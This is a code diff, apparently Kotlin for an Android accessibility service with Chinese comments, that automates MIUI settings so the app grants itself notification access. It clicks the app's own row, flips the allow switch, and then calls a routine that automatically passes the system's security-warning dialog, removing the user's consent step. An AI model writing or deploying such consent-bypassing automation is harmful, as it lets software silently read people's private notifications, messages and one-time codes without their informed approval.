@@ -44,17 +44,15 @@ object Step3 {
         var ticks = 0
         var rowClicked = false
         var toggleClicked = false
+        var riskHandled = false
 
         fun tick() {
+            // 已授权 → 立刻结束（这是唯一的成功判据）
             if (NotificationAccessActivator.isGranted(service)) {
                 Log.d(TAG, "已授权")
                 onDone(true); return
             }
-            // 危险页优先
-            if (MiuiNavigator.onRiskDialog(service)) {
-                Log.d(TAG, "出现危险页")
-                MiuiNavigator.passRiskDialog(service) { ok -> Log.d(TAG, "危险页=$ok") }
-            } else if (!rowClicked) {
+            if (!rowClicked) {
                 if (MiuiNavigator.clickByText(service, appLabel(service), contains = false)) {
                     rowClicked = true
                     Log.d(TAG, "点到自己那一行")
@@ -67,10 +65,13 @@ object Step3 {
                 if (!hit) hit = clickFirstSwitch(service)
                 if (hit) {
                     toggleClicked = true
-                    Log.d(TAG, "点了允许开关")
+                    Log.d(TAG, "点了允许开关 → 交给危险页函数")
+                    // 点开关必然弹危险页：直接交给危险页函数处理
+                    MiuiNavigator.passRiskDialog(service) { }
+                    riskHandled = true
                 }
             }
-            if (ticks++ > 40) {                       // ≈ 60 秒
+            if (ticks++ > 40) {
                 val g = NotificationAccessActivator.isGranted(service)
                 Log.w(TAG, "超时 granted=$g")
                 onDone(g); return
